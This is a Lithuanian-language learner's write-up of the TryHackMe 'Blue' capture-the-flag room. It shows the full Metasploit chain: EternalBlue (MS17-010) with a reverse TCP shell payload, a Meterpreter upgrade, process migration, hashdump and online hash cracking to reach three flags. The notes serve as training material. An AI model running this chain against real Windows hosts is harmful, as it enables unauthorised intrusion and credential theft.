#REcon
Su nmap nuskanavau duota IP adresa, radau ten atidarytus portus kuriu buvo 3. 
Machine vuln buvo ms17-010 neatsimenu kaip radau vuln?


#Gain access
Paleidau msfconsole
surast reikejo exploita kuri naudosiu ( man sita vieta dar nevisai aiski, kaip rast tuos vuln? ar tik tai kad open portas jau rodo vuln?) 
exploitas buvo ms17-010eternalblue
Pakeiciau rhosta 
usdejau ant virsaus set payload windows/x64/shell/reverse_tcp ( jaigu gerai suprantu sitas payloads kai paleidi exploita man duoda targeto access del to reverse tcp, nes tada jis is targeto i mano siuncia tas yra reverse jaigu gerai pamenu) 
run ismeta i windows shell 
ctr+z numeta i backgrounda, paziuret kokios sessions runinamos sessions -l , pereiti per sesijas sessions -i ID 
paleidau kita exploita post/multi/manage/shell-to-meterpeter ( kaip ir suprantu kas cia buvo bet ne iki galo. Ar tai reiskia kad ta windows shell kur runnino paverciau petru?)
persokau i sesija kur paleistas mano exploitas windowsuose. ten padaiau whoami ir pamaciau kokias teisias turiu, NT authority\system . 
Dabar kai sukurtas shell to meterpeter, pasitikrint kokios sesijos egzistuoja sessions -l ir atsirado nauja, tai sokt db REIKIA I TA NAUJA!
pasitikrinau getuid turiu auksciausia lvl, getpid parode kur mano erke petras sedi, 2028 powershell.exe
Uzduotis liepe migruoti i kita service, jis yra 2856 mscorsvw.exe
migrate 2856
padariau hashdump parode userius ir hashus. 
hash nucrakinau su website, nors uzduotis sake parsisiust ir crakint, bet why to work hard when u can work smart?
Reikejo surasti 3 flagus.
1flagas buvo tiesiog numestas c diske, antras flagas buvo pasleptas folderi kuri windows pagal thm megsta istrinti system32/config.
3 flagas buvo rastas su search -m -f flag3.txt.
Galejau visus taip flagus rast bet dasilo tik ant 3. 
Blue roomas baigtas. 

________________________________________________________________________________


# THM Blue Lab Recap

## Recon

Su `nmap` nuskanavau duotą IP adresą.

Radau 3 atidarytus portus.
Pagal portus/services supratau, kad čia Windows machine ir SMB yra svarbus taikinys.

Machine vulnerability buvo **MS17-010 / EternalBlue**.

Čia dar ne visai prisimenu, kaip tiksliai radau vuln, bet logika tokia:

* `nmap` parodė SMB portus
* tada reikėjo patikrinti, ar SMB pažeidžiamas per MS17-010
* galėjo būti naudota `nmap` vuln script arba Metasploit scanner module

Galimi būdai patikrinti:

```bash
nmap --script vuln -p 445 <IP>
```

arba Metasploit viduje ieškoti scannerio:

```bash
search ms17-010
```

---

## Gain Access

Paleidau Metasploit:

```bash
msfconsole
```

Reikėjo surasti exploitą, kurį naudosiu.

Šita vieta dar ne iki galo aiški:
Metasploit viduje exploitų ieškoma su:

```bash
search ms17-010
```

Naudotas exploit buvo:

```bash
exploit/windows/smb/ms17_010_eternalblue
```

Pasirinkau exploitą:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

Pakeičiau target IP:

```bash
set RHOSTS <target-ip>
```

Uždėjau payload:

```bash
set payload windows/x64/shell/reverse_tcp
```

Jeigu gerai suprantu:
payload yra tai, kokį shellą man machine atidarys po sėkmingo exploit.

Paleidau exploitą:

```bash
run
```

Po `run` gavau Windows shell.

---

## Sessions

Kad shellą numesčiau į background:

```bash
CTRL + Z
```

Pasitikrinti aktyvias sessions:

```bash
sessions -l
```

Grįžti į session:

```bash
sessions -i <session-id>
```

---

## Shell to Meterpreter

Paleidau post module, kuris paprastą Windows shell paverčia į Meterpreter session:

```bash
use post/multi/manage/shell_to_meterpreter
```

Kaip suprantu:
šitas modulis paima jau turimą paprastą shell ir pabando sukurti geresnį Meterpreter shell.

Tada persijungiau į Meterpreter session.

Patikrinau, kas aš esu:

```bash
whoami
```

arba Meterpreter viduje:

```bash
getuid
```

`getuid` parodė, kad turiu aukščiausio lygio teises.

---

## Process / Migration

Pasitikrinau, kuriame procese sėdi Meterpreter:

```bash
getpid
```

Užduotis liepė migruoti į kitą service/process.

Process buvo:

```text
2856 mscorsvw.exe
```

Migravau:

```bash
migrate 2856
```

Kaip suprantu:
migration reiškia, kad Meterpreter persikelia į kitą Windows procesą. Tai daroma dėl stabilumo arba stealth.

---

## Hashdump

Tada padariau:

```bash
hashdump
```

Tai parodė Windows userius ir jų password hashus.

Hashą nucrackinau su website.
Užduotis sakė parsisiųsti hashą ir crackinti lokaliai, bet aš panaudojau online būdą.

Pastaba ateičiai:
geriau mokytis crackinti lokaliai su `john` arba `hashcat`, nes realiam mokymuisi tai svarbiau.

---

## Flags

Reikėjo surasti 3 flagus.

### Flag 1

Pirmas flagas buvo tiesiog numestas `C:\` diske.

### Flag 2

Antras flagas buvo paslėptas folderyje, kur Windows laiko svarbius/system/user failus.

Tiksliai nebeatsimenu kelio, bet reikėjo naršyti failų sistemą.

### Flag 3

Trečią flagą radau su Meterpreter search komanda:

```bash
search -f flag3.txt
```

Arba mano naudota forma:

```bash
search -m -f flag3.txt
```

Čia dasilo, kad visus flagus galėjau ieškoti per `search`, bet tą panaudojau tik ant trečio.

---

## Mano išvada

Blue roomas baigtas.

Pagrindinė eiga buvo:

1. Recon su `nmap`
2. Rasti SMB/MS17-010 vulnerability
3. Paleisti Metasploit
4. Naudoti EternalBlue exploit
5. Gauti shell
6. Shell numesti į background
7. Shell paversti į Meterpreter
8. Patikrinti teises su `getuid`
9. Migruoti į stabilesnį procesą
10. Padaryti `hashdump`
11. Crackinti hashą
12. Surasti 3 flagus

---

## Kas dar ne iki galo aišku

* Kaip tiksliai recon metu buvo patvirtintas MS17-010
* Kaip tiksliai pasirinkti tinkamą exploit Metasploit viduje
* Kuo skiriasi paprastas shell nuo Meterpreter
* Kodėl migration daroma būtent į konkretų procesą
* Kaip lokaliai crackinti hashus su `john` arba `hashcat`
 

